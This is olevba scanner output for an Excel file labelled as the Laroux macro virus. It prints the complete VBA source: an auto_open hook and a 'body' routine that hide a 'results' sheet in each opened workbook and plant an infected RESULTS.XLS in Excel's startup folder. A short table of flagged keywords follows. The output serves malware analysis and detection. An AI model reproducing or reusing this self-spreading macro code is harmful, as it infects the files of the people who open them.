olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.hi-50da920f16b02c69c7cc128364598d2184d9a568
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO results.bas 
in file: Virus.MSExcel.Laroux.hi-50da920f16b02c69c7cc128364598d2184d9a568 - OLE stream: '_VBA_PROJECT_CUR/VBA/results'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Compare Text

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Rem ??!!???1
    Application.OnSheetActivate = "body"
End Sub

Sub body()
Attribute body.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim awb As Workbook
    Set awb = ActiveWorkbook
    nameofworkbook$ = awb.Name
    currentdirectory$ = CurDir()
    pathofworkbook$ = awb.Path
    startpath$ = Application.StartupPath
    If Dir(startpath$ & "\" & "RESULTS.XLS") = "RESULTS.XLS" And awb.Modules.Count < 1 Then
        Application.ScreenUpdating = False
        sheetname$ = Workbooks(nameofworkbook$).Sheets(1).Name
        If sheetname$ <> "results" Then
            Workbooks("RESULTS.XLS").Sheets("results").Copy before:=Workbooks(nameofworkbook$).Sheets(1)
            Workbooks(nameofworkbook$).Sheets("results").Visible = False
        End If
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "RESULTS.XLS!body"
    ElseIf Dir(startpath$ & "\" & "RESULTS.XLS") <> "RESULTS.XLS" And awb.Modules.Count > 0 Then
        Application.ScreenUpdating = False
        Sheets("results").Visible = True
        Sheets("results").Select
        Sheets("results").Copy
        Set awb = ActiveWorkbook
        awb.Title = ""
        awb.Subject = ""
        awb.Author = ""
        awb.Keywords = ""
        awb.Comments = ""
        newname$ = awb.Name
        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "RESULTS.XLS", FileFormat:=xlNormal _
            , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
            False, CreateBackup:=False
        ChDir currentdirectory$
        Workbooks(nameofworkbook$).Sheets("results").Visible = False
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "RESULTS.XLS!body"
    End If
End Sub



-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  result
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

